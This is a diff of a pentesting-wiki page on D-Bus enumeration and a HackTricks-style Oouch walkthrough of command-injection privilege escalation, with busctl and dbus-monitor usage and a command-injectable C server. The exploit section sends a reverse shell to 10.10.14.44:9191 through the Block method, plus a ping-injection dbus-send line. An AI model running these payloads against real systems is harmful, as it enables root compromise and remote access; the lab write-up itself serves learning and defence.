@@ -1,21 +1,20 @@
 # D-Bus Enumeration & Command Injection Privilege Escalation
 
-
 ## **GUI enumeration**
 
 D-Bus is utilized as the inter-process communications (IPC) mediator in Ubuntu desktop environments. On Ubuntu, the concurrent operation of several message buses is observed: the system bus, primarily utilized by **privileged services to expose services relevant across the system**, and a session bus for each logged-in user, exposing services relevant only to that specific user. The focus here is primarily on the system bus due to its association with services running at higher privileges (e.g., root) as our objective is to elevate privileges. It is noted that D-Bus's architecture employs a 'router' per session bus, which is responsible for redirecting client messages to the appropriate services based on the address specified by the clients for the service they wish to communicate with.
 
 Services on D-Bus are defined by the **objects** and **interfaces** they expose. Objects can be likened to class instances in standard OOP languages, with each instance uniquely identified by an **object path**. This path, akin to a filesystem path, uniquely identifies each object exposed by the service. A key interface for research purposes is the **org.freedesktop.DBus.Introspectable** interface, featuring a singular method, Introspect. This method returns an XML representation of the object's supported methods, signals, and properties, with a focus here on methods while omitting properties and signals.
 
-For communication with the D-Bus interface, two tools were employed: a CLI tool named **gdbus** for easy invocation of methods exposed by D-Bus in scripts, and [[https://wiki.gnome.org/Apps/DFeet|**D-Feet**]], a Python-based GUI tool designed to enumerate the services available on each bus and to display the objects contained within each service.
+For communication with the D-Bus interface, two tools were employed: a CLI tool named **gdbus** for easy invocation of methods exposed by D-Bus in scripts, and [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), a Python-based GUI tool designed to enumerate the services available on each bus and to display the objects contained within each service.
 
 ```bash
 sudo apt-get install d-feet
 ```
-```
-![[https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png|https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png]]
 
-![[https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png|https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png]]
+![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)
+
+![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)
 
 In the first image services registered with the D-Bus system bus are shown, with **org.debin.apt** specifically highlighted after selecting the System Bus button. D-Feet queries this service for objects, displaying interfaces, methods, properties, and signals for chosen objects, seen in the second image. Each method's signature is also detailed.
 
@@ -56,10 +55,10 @@ org.freedesktop.PolicyKit1               - -               -                (act
 org.freedesktop.hostname1                - -               -                (activatable) -                         -
 org.freedesktop.locale1                  - -               -                (activatable) -                         -
 ```
-```
+
 #### Connections
 
-[[https://en.wikipedia.org/wiki/D-Bus|From wikipedia:]] When a process sets up a connection to a bus, the bus assigns to the connection a special bus name called _unique connection name_. Bus names of this type are immutable—it's guaranteed they won't change as long as the connection exists—and, more importantly, they can't be reused during the bus lifetime. This means that no other connection to that bus will ever have assigned such unique connection name, even if the same process closes down the connection to the bus and creates a new one. Unique connection names are easily recognizable because they start with the—otherwise forbidden—colon character.
+[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) When a process sets up a connection to a bus, the bus assigns to the connection a special bus name called _unique connection name_. Bus names of this type are immutable—it's guaranteed they won't change as long as the connection exists—and, more importantly, they can't be reused during the bus lifetime. This means that no other connection to that bus will ever have assigned such unique connection name, even if the same process closes down the connection to the bus and creates a new one. Unique connection names are easily recognizable because they start with the—otherwise forbidden—colon character.
 
 ### Service Object Info
 
@@ -124,7 +123,7 @@ BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
         cap_setfcap cap_mac_override cap_mac_admin cap_syslog
         cap_wake_alarm cap_block_suspend cap_audit_read
 ```
-```
+
 ### List Interfaces of a Service Object
 
 You need to have enough permissions.
@@ -136,7 +135,7 @@ busctl tree htb.oouch.Block #Get Interfaces of the service object
   └─/htb/oouch
     └─/htb/oouch/Block
 ```
-```
+
 ### Introspect Interface of a Service Object
 
 Note how in this example it was selected the latest interface discovered using the `tree` parameter (_see previous section_):
@@ -158,14 +157,14 @@ org.freedesktop.DBus.Properties     interface -         -            -
 .Set                                method    ssv       -            -
 .PropertiesChanged                  signal    sa{sv}as  -            -
 ```
-```
+
 Note the method `.Block` of the interface `htb.oouch.Block` (the one we are interested in). The "s" of the other columns may mean that it's expecting a string.
 
 ### Monitor/Capture Interface
 
 With enough privileges (just `send_destination` and `receive_sender` privileges aren't enough) you can **monitor a D-Bus communication**.
 
-In order to **monitor** a **communication** you will need to be **root.** If you still find problems being root check [[https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) and [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus|https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/]]
+In order to **monitor** a **communication** you will need to be **root.** If you still find problems being root check [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) and [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
 
 > [!WARNING]
 > If you know how to configure a D-Bus config file to **allow non root users to sniff** the communication please **contact me**!
@@ -177,7 +176,7 @@ sudo busctl monitor htb.oouch.Block #Monitor only specified
 sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
 sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
 ```
-```
+
 In the following example the interface `htb.oouch.Block` is monitored and **the message "**_**lalalalal**_**" is sent through miscommunication**:
 
 ```bash
@@ -198,7 +197,7 @@ Monitoring bus message stream.
           STRING "Carried out :D";
   };
 ```
-```
+
 You can use `capture` instead of `monitor` to save the results in a pcap file.
 
 #### Filtering all the noise 
@@ -208,22 +207,22 @@ If there is just too much information on the bus, pass a match rule like so:
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
-```
+
 Multiple rules can be specified. If a message matches _any_ of the rules, the message will be printed. Like so:
 
 ```bash
 dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```
-```
+
 ```bash
 dbus-monitor "type=method_call" "type=method_return" "type=error"
 ```
-```
-See the [[http://dbus.freedesktop.org/doc/dbus-specification.html|D-Bus documentation]] for more information on match rule syntax.
+
+See the [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) for more information on match rule syntax.
 
 ### More
 
-`busctl` has even more options, [[https://www.freedesktop.org/software/systemd/man/busctl.html|**find all of them here**]].
+`busctl` has even more options, [**find all of them here**](https://www.freedesktop.org/software/systemd/man/busctl.html).
 
 ## **Vulnerable Scenario**
 
@@ -239,17 +238,17 @@ As user **qtc inside the host "oouch" from HTB** you can find an **unexpected D-
 <busconfig>
 
     <policy user="root">
-        
+        <allow own="htb.oouch.Block"/>
     </policy>
 
 	<policy user="www-data">
-		
-		
+		<allow send_destination="htb.oouch.Block"/>
+		<allow receive_sender="htb.oouch.Block"/>
 	</policy>
 
 </busconfig>
 ```
-```
+
 Note from the previous configuration that **you will need to be the user `root` or `www-data` to send and receive information** via this D-BUS communication.
 
 As user **qtc** inside the docker container **aeb4525789d8** you can find some dbus related code in the file _/code/oouch/routes.py._ This is the interesting code:
@@ -265,7 +264,7 @@ if primitive_xss.search(form.textfield.data):
         bus.close()
         return render_template('hacker.html', title='Hacker')
 ```
-```
+
 As you can see, it is **connecting to a D-Bus interface** and sending to the **"Block" function** the "client_ip".
 
 In the other side of the D-Bus connection there is some C compiled binary running. This code is **listening** in the D-Bus connection **for IP address and is calling iptables via `system` function** to block the given IP address.\
@@ -284,13 +283,13 @@ At the end of this page you can find the **complete C code of the D-Bus applicat
                                      block_vtable,
                                      NULL);
 ```
-```
+
 Also, in line 57 you can find that **the only method registered** for this D-Bus communication is called `Block`(_**Thats why in the following section the payloads are going to be sent to the service object `htb.oouch.Block`, the interface `/htb/oouch/Block` and the method name `Block`**_):
 
 ```c
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
-```
+
 #### Python
 
 The following python code will send the payload to the D-Bus connection to the `Block` method via `block_iface.Block(runme)` (_note that it was extracted from the previous chunk of code_):
@@ -304,13 +303,13 @@ runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
 response = block_iface.Block(runme)
 bus.close()
 ```
-```
+
 #### busctl and dbus-send
 
 ```bash
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
 ```
-```
+
 - `dbus-send` is a tool used to send message to “Message Bus”
 - Message Bus – A software used by systems to make communications between applications easily. It’s related to Message Queue (messages are ordered in sequence) but in Message Bus the messages are sending in a subscription model and also very quick.
 - “-system” tag is used to mention that it is a system message, not a session message (by default).
@@ -325,7 +324,7 @@ _Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) refere
 ```c:d-bus_server.c
 //sudo apt install pkgconf
 //sudo apt install libsystemd-dev
-//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd
+//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -379,12 +378,14 @@ static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_err
         r = system(command_buffer);
 }
 
+
 /* The vtable of our little object, implements the net.poettering.Calculator interface */
 static const sd_bus_vtable block_vtable[] = {
         SD_BUS_VTABLE_START(0),
         SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
         SD_BUS_VTABLE_END
 };
+
 
 int main(int argc, char *argv[]) {
         /*
@@ -398,6 +399,7 @@ int main(int argc, char *argv[]) {
          *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
          *      as long as the user keeps it alive.
          */
+
 
         /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
         signal(SIGCHLD,SIG_IGN);
@@ -459,13 +461,13 @@ finish:
         return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 }
 ```
-```
+
 ## Automated Enumeration Helpers (2023-2025)
 
 Enumeration of a large D-Bus attack surface manually with `busctl`/`gdbus` quickly becomes painful. Two small FOSS utilities released in the last few years can speed things up during red-team or CTF engagements:
 
 ### dbusmap ("Nmap for D-Bus")
-* Author: @taviso – [[https://github.com/taviso/dbusmap|https://github.com/taviso/dbusmap]]
+* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
 * Written in C; single static binary (<50 kB) that walks every object path, pulls the `Introspect` XML and maps it to the owning PID/UID.
 * Useful flags:
   ```bash
@@ -478,7 +480,7 @@ Enumeration of a large D-Bus attack surface manually with `busctl`/`gdbus` quick
 * The tool marks unprotected well-known names with `!`, instantly revealing services you can *own* (take over) or method calls that are reachable from an unprivileged shell.
 
 ### uptux.py
-* Author: @initstring – [[https://github.com/initstring/uptux|https://github.com/initstring/uptux]]
+* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
 * Python-only script that looks for *writable* paths in systemd units **and** overly-permissive D-Bus policy files (e.g. `send_destination="*"`).
 * Quick usage:
   ```bash
@@ -525,10 +527,8 @@ Use `dbusmap --enable-probes` or manual `busctl call` to confirm whether a patch
 
 ## References
 
-- [[https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/|https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/]]
-- [[https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html|https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html]]
+- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
+- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
 
-- [[https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/|https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/]]
-
-
+- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
 
